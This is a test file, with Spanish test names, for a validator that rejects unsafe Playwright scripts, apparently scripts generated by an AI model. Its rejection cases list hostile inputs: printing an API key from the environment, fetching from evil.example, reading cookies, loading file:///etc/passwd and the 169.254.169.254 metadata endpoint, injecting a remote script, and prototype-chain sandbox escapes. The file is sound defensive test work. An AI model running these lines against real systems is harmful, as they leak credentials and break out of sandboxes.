import { describe, expect, it } from 'vitest';
import { MAX_SCRIPT_LENGTH } from './index.js';
import { checkScriptPolicy, countAssertions } from './script-policy.js';

const validScript = `import { test, expect } from '@playwright/test';

test('login inválido muestra un error', async ({ page }) => {
  await test.step('abrir la página de login', async () => {
    await page.goto('https://www.saucedemo.com');
  });

  await test.step('enviar credenciales inválidas', async () => {
    await page.getByPlaceholder('Username').fill('usuario_invalido');
    await page.getByRole('button', { name: 'Login' }).click();
  });

  await test.step('verificar el mensaje de error', async () => {
    await expect(page.locator('[data-test="error"]')).toBeVisible();
  });
});
`;

const withBody = (body: string) => `import { test, expect } from '@playwright/test';

test('caso', async ({ page }) => {
  await test.step('paso', async () => {
    ${body}
    await expect(page).toHaveURL(/saucedemo/);
  });
});
`;

const violationsOf = (script: string): string[] => {
  const result = checkScriptPolicy(script);
  return result.ok ? [] : result.violations;
};

describe('checkScriptPolicy', () => {
  it('acepta un script Playwright válido', () => {
    expect(checkScriptPolicy(validScript)).toEqual({ ok: true });
  });

  it.each([
    ['eval', `eval('1 + 1');`],
    ['new Function', `new Function('return 1')();`],
    ['require', `const fs = require('fs');`],
    ['process', `console.log(process.env.ANTHROPIC_API_KEY);`],
    ['globalThis', `globalThis.x = 1;`],
    ['fetch fuera del navegador', `await fetch('https://evil.example');`],
    ['import dinámico', `await import('node:fs');`],
    ['import.meta', `console.log(import.meta.url);`],
    ['cadena de prototipos', `const F = page.constructor.constructor;`],
    ['corchetes con literal', `const F = page['constructor'];`],
    ['corchetes dinámicos', `const k = 'constr' + 'uctor'; const F = page[k];`],
    ['plantilla con sustitución', "const k = 'tor'; const F = page[`construc${k}`];"],
    ['desestructuración', `const { constructor: C } = page;`],
    ['desestructuración abreviada', `const { evaluate } = page;`],
    ['Reflect', `const e = Reflect.get(page, 'evaluate');`],
    ['Object', `const p = Object.getPrototypeOf(page);`],
    ['page.evaluate', `await page.evaluate(() => document.cookie);`],
    ['page.request', `await page.request.get('https://evil.example');`],
    ['captura con ruta', `await page.screenshot({ path: '/etc/x.png' });`],
    ['espera fija', `await page.waitForTimeout(1000);`],
    ['setTimeout', `await new Promise((r) => setTimeout(r, 1000));`],
  ])('rechaza %s', (_name, body) => {
    expect(violationsOf(withBody(body)).length).toBeGreaterThan(0);
  });

  it('rechaza el fixture request', () => {
    const script = validScript.replace('async ({ page })', 'async ({ page, request })');
    expect(violationsOf(script)).toEqual([expect.stringContaining('"request"')]);
  });

  it.each([
    ['otro módulo', `import fs from 'node:fs';\n`],
    ['import por defecto', `import pw from '@playwright/test';\n`],
    ['import con alias', `import { test as t } from '@playwright/test';\n`],
    ['import no permitido', `import { chromium } from '@playwright/test';\n`],
  ])('rechaza %s', (_name, extraImport) => {
    expect(violationsOf(extraImport + validScript)).toEqual([
      expect.stringContaining('solo se permite'),
    ]);
  });

  it('exige test.step y expect', () => {
    const script = `import { test, expect } from '@playwright/test';
test('sin pasos', async ({ page }) => {
  await page.goto('https://www.saucedemo.com');
});
`;
    expect(violationsOf(script)).toEqual([
      'falta al menos un test.step()',
      'falta al menos una aserción expect()',
    ]);
  });

  it('rechaza errores de sintaxis', () => {
    expect(violationsOf(`${validScript}\n test(`)).toEqual([
      expect.stringContaining('error de sintaxis'),
    ]);
  });

  it('rechaza scripts demasiado largos', () => {
    expect(violationsOf('x'.repeat(MAX_SCRIPT_LENGTH + 1))).toEqual([
      expect.stringContaining('supera'),
    ]);
  });

  it('permite índices numéricos y literales de texto', () => {
    expect(checkScriptPolicy(withBody(`const items = ['a']; const first = items[0];`))).toEqual({
      ok: true,
    });
  });
});

describe('countAssertions', () => {
  it('cuenta expect, expect.soft y expect.poll, no los matchers encadenados', () => {
    const script = withBody(`
    await expect(page.getByText('a')).toBeVisible();
    await expect.soft(page.getByText('b')).not.toBeVisible();
    await expect.poll(async () => 1).toBe(1);
    const expectText = 'expect(';`);
    // Más la aserción que añade withBody.
    expect(countAssertions(script)).toBe(4);
  });

  it('devuelve 0 sin aserciones', () => {
    expect(countAssertions(`test('x', async () => {});`)).toBe(0);
  });
});

describe('checkScriptPolicy con dominios permitidos', () => {
  const allowedDomains = ['saucedemo.com'];
  const navigation = (body: string) => {
    const result = checkScriptPolicy(withBody(body), { allowedDomains });
    return result.ok ? [] : result.violations;
  };

  it('acepta el dominio permitido y sus subdominios', () => {
    expect(checkScriptPolicy(validScript, { allowedDomains })).toEqual({ ok: true });
    expect(navigation(`await page.goto('https://saucedemo.com/inventory.html');`)).toEqual([]);
  });

  it.each([
    ['otro dominio', `await page.goto('https://example.com');`, 'no está en la lista'],
    ['un dominio que solo lo contiene', `await page.goto('https://evilsaucedemo.com');`, 'no está'],
    ['una IP', `await page.goto('http://169.254.169.254/latest');`, 'no está en la lista'],
    ['file://', `await page.goto('file:///etc/passwd');`, 'solo admite URLs http'],
    ['una URL relativa', `await page.goto('/inventory.html');`, 'URL absoluta'],
    [
      'una URL construida',
      "const host = 'example.com'; await page.goto(`https://${host}`);",
      'literal',
    ],
    [
      'una URL en variable',
      `const url = 'https://saucedemo.com'; await page.goto(url);`,
      'literal',
    ],
  ])('rechaza navegar a %s', (_name, body, message) => {
    expect(navigation(body)).toEqual([expect.stringContaining(message)]);
  });

  it('exige URLs literales http(s) aunque se permita cualquier dominio', () => {
    expect(violationsOf(withBody(`await page.goto('file:///etc/passwd');`))).toEqual([
      expect.stringContaining('solo admite URLs http'),
    ]);
    expect(violationsOf(withBody(`await page.goto('https://example.com');`))).toEqual([]);
  });

  it.each([
    ['test.use', `test.use({ proxy: { server: 'http://evil.example' } });`],
    ['test.extend', `const t = test.extend({});`],
    ['el fixture browser', `const ctx = await page.context().browser().newContext();`],
    ['setContent', `await page.setContent('<iframe src="file:///etc/passwd"></iframe>');`],
    ['addScriptTag', `await page.addScriptTag({ url: 'https://evil.example/x.js' });`],
  ])('rechaza %s', (_name, body) => {
    expect(violationsOf(withBody(body)).length).toBeGreaterThan(0);
  });
});
